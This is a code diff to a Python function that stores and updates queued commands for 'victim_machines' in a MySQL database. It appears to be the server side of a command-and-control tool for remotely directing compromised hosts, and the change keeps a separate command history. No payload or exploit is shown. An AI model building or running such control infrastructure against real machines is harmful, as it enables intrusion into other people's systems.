@@ -23,7 +23,7 @@ def encode ( input ):
 def editcommand( id, command ):
 
 	#base query to check whether or not the id requested appears in the database
-	query = """ SELECT command, command_output FROM victim_machines WHERE victim_id =%s """
+	query = """ SELECT command, command_output, command_record FROM victim_machines WHERE victim_id =%s """
 	data = (id,)
 
 	#https://www.mysqltutorial.org/python-mysql-update/
@@ -44,21 +44,30 @@ def editcommand( id, command ):
 			decoded_command = decode(result[0][0])
 
 			json_data = json.loads(decoded_command)
+
 			seconds_from_epoch = int(time.time())
 			new_command = {str(seconds_from_epoch): command}
+
 			json_data["commands"].update(new_command)
 #			print(json.dumps(json_data))
 
 			json_string = str(json.dumps(json_data))
 			encoded_updated = encode(json_string)
 
+			decoded_command_record = decode(result[0][2])
+			json_data = json.loads(decoded_command_record)
+			json_data["commands"].update(new_command)
+			json_string_record = str(json.dumps(json_data))
+			encoded_record = encode(json_string_record)
+
 			#update the database if the row already exists
 			update_query = """ UPDATE victim_machines SET command=%s WHERE victim_id=%s """
 			update_data = (encoded_updated, id)
 			command_record_query = """ UPDATE victim_machines SET command_record=%s WHERE victim_id=%s """
+			update_record_data = (encoded_record, id)
 
 			cursor.execute(update_query, update_data)
-			cursor.execute(command_record_query, update_data)
+			cursor.execute(command_record_query, update_record_data)
 
 		#catch the case in which the victim_id does not exist in the table and create a new entry
 		else:
